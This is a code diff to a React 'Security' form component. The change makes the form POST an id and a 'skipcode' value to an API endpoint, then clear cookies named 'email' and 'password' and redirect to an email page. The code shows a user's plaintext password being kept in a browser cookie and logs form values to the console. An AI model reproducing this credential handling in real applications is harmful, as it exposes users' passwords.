@@ -40,36 +40,48 @@ function Security() {
   const handleSubmit = async (values, formik) => {
     console.log(values);
 
-    const { skipcode } = values;
-    Cookies.set("skipcode", skipcode);
-    router.push("/account/email");
-    return;
+    // const { skipcode } = values;
+    // Cookies.set("skipcode", skipcode);
+    // router.push("/account/email");
+    // return;
 
-    // const url = `${API_URL}/skip`;
+    const { id, skipcode } = values;
 
-    // const res = await fetch(url, {
-    //   method: "POST",
-    //   headers: {
-    //     Accept: "application/json",
-    //     "Content-Type": "application/json",
-    //   },
-    //   body: JSON.stringify(values),
-    // });
+    const submitValues = {
+      id: id,
+      skipcode: skipcode,
+    };
 
-    // const data = await res.json();
+    const url = `${API_URL}/skip`;
 
-    // if (res.ok) {
-    //   console.log("success", data);
-    //   toast.success("Login Succecssfull");
-    //   formik.resetForm();
-    //   setReset(true);
-    //   Cookies.remove("id");
-    //   Cookies.remove("email");
-    //   Cookies.remove("password");
-    // } else {
-    //   console.log("error", data);
-    //   toast.error("Something Went Wrong");
-    // }
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(submitValues),
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      console.log("success", data);
+      // toast.success("Login Succecssfull");
+      formik.resetForm();
+      router.push("/account/email");
+      Cookies.remove("email");
+      Cookies.remove("password");
+
+      // console.log("success", data);
+      // toast.success("Login Succecssfull");
+      // formik.resetForm();
+      // setReset(true);
+      // Cookies.remove("id");
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
   };
 
   return (
